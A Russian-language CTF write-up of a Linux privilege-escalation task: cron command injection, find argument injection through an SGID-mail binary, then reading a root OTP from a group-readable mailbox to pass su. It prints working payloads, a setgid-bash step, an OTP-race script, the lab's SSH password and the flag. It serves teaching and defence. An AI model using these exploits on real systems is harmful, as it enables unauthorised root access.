# Undercover — write-up (task12) — РЕШЕНО

**Avito CTF 2026 · Linux / privilege escalation**

## 1. Условие (кратко)

Мы — оперативник-медоед, уже захвативший учётку самой бесправной «рабочей пчелы» `worker`.
Нужно **тихо и быстро** дорасти до `root` и прочитать `/root/flag.txt`.

```
ssh worker@undercover-zhvo8wkj.avitoctf.ru
пароль: ufqIDMVBm5MHPHg8dcVTcQ
```

Итоговая цепочка привилегий, которую мы собрали:

```
worker  ──(cron+инъекция команд)──►  backupuser
        ──(SGID-mail + инъекция аргументов в find)──►  egid=mail
        ──(OTP в mailbox root, читаемом группой mail)──►  root
```

Три *отдельные* небрежности по-одиночке безобидны, но выстраиваются в путь до root.

## 2. Разведка

Методология privesc = **энумерация → найти неаккуратно настроенную вещь, работающую с более высокими правами**. Прогнал стандартный чек-лист (см. также `task.md`):

- `id` — `uid=1000(worker)`, обычный юзер.
- `sudo -n -l` — sudo требует пароль → мимо.
- `find / -perm -4000` и `find / -perm -2000` — **SUID/SGID** бинарники (запускаются с правами владельца/группы файла).
- `getcap -r /` — capabilities.
- `/etc/cron.d/*`, `/etc/crontab`, таймеры — **что root и другие юзеры запускают по расписанию**, и не писабельны ли их входные данные.
- версия ОС/ядра, запущенные сервисы.

Что нашлось и почему это заинтересовало:

- **Debian 12 в Docker**. Критично: **каждое SSH-подключение = свежий эфемерный контейнер**. Значит все звенья цепочки надо проходить в ОДНОЙ сессии (я держал persistent-канал через `run.py`/`sc.sh`), иначе изменения теряются между командами.
- `/etc/cron.d/backup` — раз в минуту что-то запускается от **`backupuser`** (чужие права по расписанию → первый кандидат).
- SGID-бинарь **`delete_old_mail`** с группой **`mail`** (`-rwxr-sr-- backupuser mail`) — «утилита» с повышенной группой.
- SUID `exim4`, PAM-модуль `pam_otp_root.py` в `/etc/pam.d/su` — почта и нестандартная аутентификация root.

Гипотеза родилась сразу: почта (`mail`) + OTP для root по почте + бинарь, дающий `gid=mail` = вероятно, ключ к root лежит в почтовом ящике root, а `gid=mail` даёт к нему доступ. Осталось найти, как получить `gid=mail`, и как до него — `backupuser`.

## 3. Уязвимость (root cause)

Три бага, каждый — классическая ошибка:

1. **Инъекция команд**: содержимое писабельного файла подставляется в строку `sh -c "…$INPUT…"` без кавычек.
2. **Инъекция аргументов**: SGID-бинарь зовёт `system("find … -mtime +<ARG> …")`, а блеклист символов **неполон** (пропускает пробел, `+`, `{}`), что позволяет дописать `-exec`.
3. **Секрет в групп-читаемом ресурсе**: одноразовый OTP для входа под root кладётся в `/var/mail/root` с правами `660 mail:mail`, то есть его может прочитать **вся группа `mail`**.

## 4. Эксплуатация шаг за шагом

### Звено 1: command injection (worker → backupuser)

`/etc/cron.d/backup` раз в минуту от имени `backupuser` делает по сути:

```sh
INPUT=$(cat "$1")                                        # $1 = /backup/listing
/bin/sh -c "rsync --archive --verbose $INPUT /backup/"   # $INPUT НЕ в кавычках!
```

Файл `/backup/listing` имеет права `0777` — **писать может кто угодно, включая worker**.
Раз его содержимое склеивается в `sh -c "…$INPUT…"`, это прямая **инъекция команд**:
пишем в файл `;<команда>;#`, и в ближайшую минуту `<команда>` выполнится уже как `backupuser`.

*Почему баг:* недоверенный ввод (содержимое писабельного файла) попадает в строку шелл-команды. Правильно — не звать `sh -c` со склейкой, а передавать аргументы массивом.

### Звено 2: SGID-mail + argument injection (backupuser → egid=mail)

`/backup/deactivated/utils/delete_old_mail` — `-rwxr-sr-- backupuser mail` (**SGID-mail**: при запуске получает `egid=mail`). Внутри:

```c
setregid(mail, mail);
system("find /var/mail/ -type f -mtime +<ARG> -print -delete");   // <ARG> из аргумента
```

Есть блеклист `has_forbidden_chars` (`; ' " \` \ $ ( ) | & < >`), но он **не запрещает пробелы, `+` и `{}`** → можно дописать аргументы в `find`. Полезная нагрузка (файл `payload.txt` / поле аргумента):

```
1 -o -type d -exec /tmp/.m.sh {} + -o -type f
```

`find -exec /tmp/.m.sh {} +` запустит наш скрипт `/tmp/.m.sh` уже с `egid=mail`. Этим скриптом (`m.sh`) я сделал **постоянный SGID-mail bash**:

```sh
cp /bin/bash /tmp/.mbash && chmod 2755 /tmp/.mbash   # 2755 = setgid, group=mail
```

*Тонкость с правами доступа.* Каталог `/backup/deactivated` = `drwx---r-x root backupuser`: у `backupuser` group-биты `---` → **войти внутрь он не может**, а `worker` (other `r-x`) может, но сам бинарь исполним только владельцем-`backupuser`. Обход: **worker выносит бинарь наружу** (`mv /backup/deactivated/utils/delete_old_mail /tmp/.dom` — `mv` в пределах одного overlayfs сохраняет SGID-бит), а **запускает его backupuser** через звено 1.

Итого полезная нагрузка в `/backup/listing` (см. `payload.txt`):

```
;/tmp/.dom "1 -o -type d -exec /tmp/.m.sh {} + -o -type f";#
```

По cron это выполняется как `backupuser` → `/tmp/.dom` (наш `delete_old_mail`) под `egid=mail` через `find -exec` создаёт `/tmp/.mbash` — bash с SGID-mail.

### Звено 3: OTP-по-почте (egid=mail → root)

`/etc/pam.d/su`:

```
auth requisite pam_python.so /usr/local/bin/pam_otp_root.py
auth [success=done default=ignore] pam_succeed_if.so quiet user = root
```

Модуль `pam_otp_root.py` генерит 9-значный OTP и **отправляет его письмом root** (`mail -s "OTP for root login" root` → exim → `/var/mail/root`, режим `660 mail:mail`), затем спрашивает код у пользователя. Верный OTP проходит `requisite`, а `pam_succeed_if user=root` даёт `success=done` → **root без пароля root**.

**Ключевое наблюдение:** ящик `/var/mail/root` **читается группой `mail`**, а мы на звене 2 получили `egid=mail`. Значит: запускаем `su root`, параллельно (с `egid=mail`) читаем `/var/mail/root`, выдёргиваем 9-значный OTP, скармливаем его в `su` — и становимся root.

Оркестратор `orch.sh` (запускается нашим `/tmp/.mbash -p`, то есть с `egid=mail`) делает это гонкой:

```sh
rm -f /var/mail/root ...                      # убрать старое письмо, чтобы не поймать чужой OTP
mkfifo /tmp/sin; exec 3<>/tmp/sin             # канал для подачи OTP в su
# su в псевдотерминале (script), сразу читает флаг после логина:
script -q -f -c 'su root -c "id; echo FLAGSTART; cat /root/flag.txt; echo FLAGEND; \
     cat /root/flag.txt >/tmp/flag_out"' /tmp/su.log < /tmp/sin &
# поллим mailbox root, пока не появится строка ровно из 9 цифр:
for i in $(seq 1 200); do
  OTP=$(tr -d '\r' < /var/mail/root | awk '/^[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]$/{print; exit}')
  [ -n "$OTP" ] && break
  sleep 0.25
done
printf '%s\n' "$OTP" >&3                        # отдаём OTP в su через fifo
```

`su` принимает OTP → `pam_succeed_if user=root` → **root** → `cat /root/flag.txt` пишет флаг в `/tmp/flag_out`.

*Почему баг:* секрет второго фактора (OTP) не должен быть доступен никому, кроме проверяющего. Здесь он лежит в mailbox, читаемом целой группой `mail`, в которую мы смогли попасть.

## 5. PoC (всё в одной сессии)

Поскольку контейнер эфемерный, шаги выполняются в одном persistent-канале:

1. `mv /backup/deactivated/utils/delete_old_mail /tmp/.dom` — вынести SGID-mail бинарь наружу (worker может).
2. Записать `/tmp/.m.sh` (см. `m.sh`): `cp /bin/bash /tmp/.mbash; chmod 2755 /tmp/.mbash`.
3. В `/backup/listing` записать полезную нагрузку (см. `payload.txt`) и ждать cron (до минуты):
   `;/tmp/.dom "1 -o -type d -exec /tmp/.m.sh {} + -o -type f";#`
   → cron(backupuser) → `find -exec` создаёт `/tmp/.mbash` c SGID-mail.
4. Запустить `/tmp/.mbash -p orch.sh` (сессия с `egid=mail`): гонка `su root` ↔ чтение OTP из `/var/mail/root` → root → флаг.

## 6. Флаг

```
avito{the_OP3ra7I0n_wAS_suCce5sfuL}
```

Прочитан из `/root/flag.txt` от имени `uid=0(root)` (совпадает с `FLAG.txt` в папке).

## 7. Выводы / уроки

- **Три мелочи → root.** По отдельности writable-файл, SGID-утилита и OTP-в-почте выглядят безобидно; privesc — это искусство сшивать их в цепочку.
- **Экранируй ввод.** Не `sh -c "…$X…"`, а массив аргументов. И блеклист символов — плохая защита от инъекции аргументов: `find` управляется через `-o`, `-exec`, `{}`, `+`, которые не «спецсимволы».
- **SGID/SUID + `system()` = красный флаг.** Утилита с повышенной группой не должна вызывать шелл со строкой, собранной из ввода.
- **Секреты — только проверяющему.** OTP в групп-читаемом файле = OTP скомпрометирован для всей группы.
- **Эфемерное окружение.** Docker-контейнер на каждое подключение → эксплойт нужно собирать в одной сессии (persistent-канал), иначе артефакты между командами теряются.
